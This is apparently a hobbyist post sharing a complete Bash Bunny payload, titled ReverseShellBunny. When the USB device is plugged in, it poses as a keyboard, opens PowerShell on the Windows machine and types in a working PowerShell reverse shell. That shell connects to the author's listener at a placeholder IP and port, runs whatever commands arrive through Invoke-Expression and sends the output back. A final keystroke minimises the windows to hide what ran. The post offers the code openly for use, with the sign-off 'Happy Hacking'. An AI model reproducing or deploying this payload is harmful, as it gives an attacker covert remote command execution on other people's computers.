A simple reverse shell for the Bash Bunny. I use it to connect to a Lightsail server. Just enter the IP and Port of the listener. Listener command nc -lnvp then port number. Put payload in switch folder.

Heres the code. Happy Hacking.

#TITLE. ReverseShellBunny #AUTHOR.DarkStorme #Reverse Shell for the Bash Bunny

#!/bin/bash

Set attack mode to HID
ATTACKMODE HID

LED attack indication
LED ATTACK

Open PowerShell
QUACK GUI r QUACK DELAY 500 QUACK STRING powershell.exe QUACK DELAY 500 QUACK ENTER QUACK DELAY 2000

Define the PowerShell payload
PS_PAYLOAD='$client = New-Object System.Net.Sockets.TCPClient("IP ADDRESS",PORT);$stream = $client.GetStream();$bytes = New-Object byte[] 65536;while (($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {$data = [System.Text.Encoding]::ASCII.GetString($bytes, 0, $i);$sendback = (Invoke-Expression -Command $data 2>&1 | Out-String);$sendbyte = [System.Text.Encoding]::ASCII.GetBytes($sendback);$stream.Write($sendbyte, 0, $sendbyte.Length);$stream.Flush()};$client.Close()'

Send the PowerShell payload
QUACK STRING "$PS_PAYLOAD" QUACK ENTER QUACK DELAY 5000 QUACK GUI d

LED finish indication
LED FINISH